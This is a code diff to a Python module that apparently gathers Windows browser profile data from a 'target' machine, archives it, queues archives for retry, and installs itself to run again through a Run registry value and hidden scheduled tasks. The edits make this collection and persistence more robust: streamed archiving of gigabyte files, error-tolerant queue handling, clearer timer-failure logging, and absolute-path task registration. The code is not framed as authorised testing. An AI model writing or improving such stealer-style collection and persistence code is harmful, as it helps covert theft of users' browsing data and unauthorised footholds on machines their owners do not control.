@@ -28,6 +28,9 @@ from . import log, winapi
 
 _MAX_JSON_BYTES: Final[int] = 32 * 1024 * 1024
 _MAX_ARCHIVE_FILES: Final[int] = 50_000
+# 1 MiB: big enough that the syscall overhead disappears on a large member, small
+# enough that a 1.2 GB file never has more than a block in memory.
+_ARCHIVE_CHUNK: Final[int] = 1 << 20
 _SIDECARS: Final[tuple[str, ...]] = ("-wal", "-shm")
 
 # Chrome stores microseconds since 1601-01-01; Unix epoch is 11644473600 s later.
@@ -40,6 +43,11 @@ _ZIP_EPOCH: Final[tuple[int, int, int, int, int, int]] = (1980, 1, 1, 0, 0, 0)
 _DETACHED_PROCESS: Final[int] = 0x00000008
 _CREATE_NEW_PROCESS_GROUP: Final[int] = 0x00000200
 _CREATE_NO_WINDOW: Final[int] = 0x08000000
+
+# Every binary this module shells out to is named absolutely. ``subprocess`` searches
+# PATH for a bare name, and an elevated run that resolves ``schtasks`` off a PATH entry
+# the target controls is running somebody else's binary with the machine's blessing.
+_SYSTEM32: Final[Path] = Path(os.environ.get("SYSTEMROOT") or r"C:\Windows") / "System32"
 
 
 def executable_path() -> Path:
@@ -193,6 +201,16 @@ def make_archive(source: Path, destination: Path) -> Path | None:
     image carry a 1601 epoch, which is Windows' zero and well before the format's
     floor. A fixed epoch also makes two runs over the same tree produce comparable
     members instead of recording when the copy happened.
+
+    Each member is streamed rather than read into bytes first. ``read_bytes`` followed
+    by ``writestr`` holds two copies of the file in memory at once, and a collected
+    profile contains single files of a gigabyte or more: a 1.2 GB history index meant
+    2.4 GB resident at the moment of compression. One block moves at a time now.
+
+    A file that opens and then dies mid-read leaves a short member rather than a lost
+    archive. The alternative is refusing the whole tree because one locked file moved
+    under the reader, and a short member costs that one entry: every other entry opens,
+    and a zip tool names the damaged one.
     """
     if not source.is_dir():
         log.logger.debug("archive source is not a directory: %s", source)
@@ -203,18 +221,13 @@ def make_archive(source: Path, destination: Path) -> Path | None:
             for path in _iter_files(source):
                 if path == destination:
                     continue
-                try:
-                    data = path.read_bytes()
-                except OSError:
-                    log.logger.debug("archive skipped: %s", path, exc_info=True)
-                    continue
-
                 info = zipfile.ZipInfo(path.relative_to(source).as_posix(), _ZIP_EPOCH)
                 info.compress_type = zipfile.ZIP_DEFLATED
                 info.external_attr = 0o600 << 16
                 try:
-                    archive.writestr(info, data)
-                except (OSError, ValueError):
+                    with path.open("rb") as handle, archive.open(info, "w") as member:
+                        shutil.copyfileobj(handle, member, _ARCHIVE_CHUNK)
+                except (OSError, ValueError, RuntimeError):
                     log.logger.debug("archive member refused: %s", path, exc_info=True)
     except OSError:
         log.logger.debug("archive creation failed: %s", destination, exc_info=True)
@@ -590,17 +603,39 @@ def pending_queue() -> list[Path]:
 
 
 def drop_pending(archive: Path) -> None:
-    """Remove an archive and its journal. Missing files are not an error."""
-    archive.unlink(missing_ok=True)
-    archive.with_suffix(".json").unlink(missing_ok=True)
+    """Remove an archive and its journal. Missing files are not an error.
+
+    A locked file is not an error either. This runs from the trim loop, which is
+    reached *after* a new archive has been parked and journalled: an exception here
+    used to escape into ``park_archive``'s handler, which then reported that nothing had
+    been parked while the file sat on disk and no retry task was registered.
+    """
+    for path in (archive, archive.with_suffix(".json")):
+        try:
+            path.unlink(missing_ok=True)
+        except OSError:
+            log.logger.debug("queue: could not remove %s", path, exc_info=True)
 
 
 def bump_pending(archive: Path) -> int:
-    """Record one more failed attempt. Returns the running count."""
+    """Record one more failed attempt. Returns the running count.
+
+    The journal is a file on a machine this run does not control, so its contents are
+    not trusted: ``attempts`` may be a string, a float, or absent. Anything unreadable
+    counts as zero rather than raising out of a retry that was already reporting a
+    failure — an exception here abandoned the whole queue.
+    """
     journal = archive.with_suffix(".json")
     note = read_json(journal)
     record: dict[str, Any] = note if isinstance(note, dict) else {}
-    attempts = int(record.get("attempts") or 0) + 1
+
+    try:
+        previous = int(record.get("attempts") or 0)
+    except (TypeError, ValueError):
+        previous = 0
+        log.logger.debug("queue: %s had an unreadable attempt count", journal.name)
+
+    attempts = max(0, previous) + 1
     record["attempts"] = attempts
     record["last_try"] = datetime.now(UTC).isoformat()
     write_json(journal, record)
@@ -678,8 +713,9 @@ def install_persistence(executable: Path, hours: int = 0) -> Path | None:
     """Stage the image and register it to run again. None on any failure.
 
     ``hours`` of zero registers the logon hook only. Above that a scheduled timer is
-    registered as well. A failure at either step returns None, and the caller reports it
-    rather than pretending the machine will come back.
+    registered as well, and a timer that will not register is logged as a warning
+    rather than swallowed: the image is still installed and still comes back on logon,
+    so the run reports "installed" and the log says which half is missing.
 
     Running from the staged path is detected and skipped, so an installed copy that fires
     on logon does not fight itself for the same file.
@@ -692,11 +728,13 @@ def install_persistence(executable: Path, hours: int = 0) -> Path | None:
         log.logger.debug("persist: refusing a path with a quote")
         return None
 
+    staged = False
     try:
         if executable.resolve() != target.resolve():
             _PERSIST_ROOT.mkdir(parents=True, exist_ok=True)
             want = executable.stat().st_size
             shutil.copyfile(executable, target)
+            staged = True
             if target.stat().st_size != want:
                 target.unlink(missing_ok=True)
                 log.logger.debug("persist: short copy, installed nothing")
@@ -708,6 +746,14 @@ def install_persistence(executable: Path, hours: int = 0) -> Path | None:
     if not winapi.registry_set_string(
         winapi.HKEY_CURRENT_USER, _RUN_KEY, _PERSIST_TASK, f'"{target}"'
     ):
+        # Nothing will ever run this copy: no Run value, no task. Leaving it behind puts
+        # a dead executable in the profile that no cleanup path knows about, so it goes
+        # back off the disk before the caller reports the failure.
+        if staged:
+            try:
+                target.unlink(missing_ok=True)
+            except OSError:
+                log.logger.debug("persist: could not remove the unregistered copy")
         return None
 
     if hours > 0:
@@ -717,7 +763,9 @@ def install_persistence(executable: Path, hours: int = 0) -> Path | None:
             else ["/sc", "daily", "/mo", "1"]
         )
         if not _persist_task(_PERSIST_TIMER, target, when):
-            log.logger.debug("persist: staged, but the timer did not register")
+            log.logger.warning(
+                "persist: installed on logon, but the %d-hour timer did not register", hours
+            )
     else:
         # A timer left by an earlier build of the same artifact would keep firing after
         # the setting is switched off, so it is removed rather than ignored.
@@ -732,12 +780,17 @@ def _persist_task(name: str, target: Path, when: list[str]) -> bool:
 
 
 def _schtasks(arguments: list[str]) -> bool:
+    # The absolute path, not the bare name. ``subprocess`` searches PATH for
+    # ``schtasks``, and a build that runs a task as SYSTEM on a machine where somebody
+    # controls a PATH entry is a build that runs somebody else's binary elevated.
+    tool = _SYSTEM32 / "schtasks.exe"
     try:
         done = subprocess.run(
-            ["schtasks", *arguments],
+            [str(tool), *arguments],
             capture_output=True,
             timeout=20,
             creationflags=_CREATE_NO_WINDOW,
+            check=False,
         )
     except (OSError, subprocess.SubprocessError):
         log.logger.debug("queue: schtasks failed", exc_info=True)
